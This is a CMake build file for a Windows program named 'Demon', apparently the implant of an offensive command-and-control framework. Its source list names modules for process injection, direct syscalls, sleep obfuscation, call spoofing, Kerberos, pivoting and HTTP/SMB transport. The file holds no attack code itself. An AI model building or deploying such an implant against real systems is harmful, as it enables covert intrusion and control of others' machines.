cmake_minimum_required(VERSION 3.19)
project( Demon C )

set( PROJECT_NAME Demon )

# set compiler settings
set( CMAKE_C_STANDARD 11 )
set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )

# adding demon sources
include_directories( Include )

set( COMMON_SOURCE
        Source/Core/Command.c
        Source/Core/Win32.c
        Source/Core/MiniStd.c
        Source/Core/Token.c
        Source/Core/Package.c
        Source/Core/SleepObf.c
        Source/Core/Spoof.c
        Source/Core/Syscalls.c
        Source/Core/SysNative.c
        Source/Core/Command.c
        Source/Core/Transport.c
        Source/Core/TransportHttp.c
        Source/Core/TransportSmb.c
        Source/Core/Parser.c
        Source/Core/Pivot.c
        Source/Core/Jobs.c
        Source/Core/Download.c
        Source/Core/Dotnet.c
        Source/Core/Socket.c
        Source/Core/Kerberos.c
        Source/Core/Thread.c
        Source/Core/Memory.c
        Source/Core/Runtime.c
        Source/Core/HwBpEngine.c
        Source/Core/HwBpExceptions.c
)

set( INJECT_SOURCE
        Source/Inject/Inject.c
        Source/Inject/InjectUtil.c
)

set( LOADER_SOURCE
        Source/Loader/CoffeeLdr.c
        Source/Loader/ObjectApi.c
)

set( MAIN_SOURCE
        # Demon Main entrypoint
        Source/Demon.c

        # windows exe
        Source/Main/MainExe.c

        # windows dll
        Source/Main/MainDll.c

        # windows service
        Source/Main/MainSvc.c
)

set( CRYPT_SOURCE
        Source/Crypt/AesCrypt.c
)

# preprocessor flags
add_compile_definitions( DEBUG )

add_compile_definitions( CONFIG_BYTES={} )
add_compile_definitions( CONFIG_SIZE=1024 )
add_compile_definitions( CONFIG_KEY_BYTES={} )
add_compile_definitions( CONFIG_KEY_SIZE=16 )
add_compile_definitions( SERVICE_NAME="DemonService" )

add_compile_definitions( TRANSPORT_HTTP )
add_compile_definitions( TRANSPORT_SMB )
add_compile_definitions( AES256 )

# linking library
link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )

# add compiled demons
add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} )
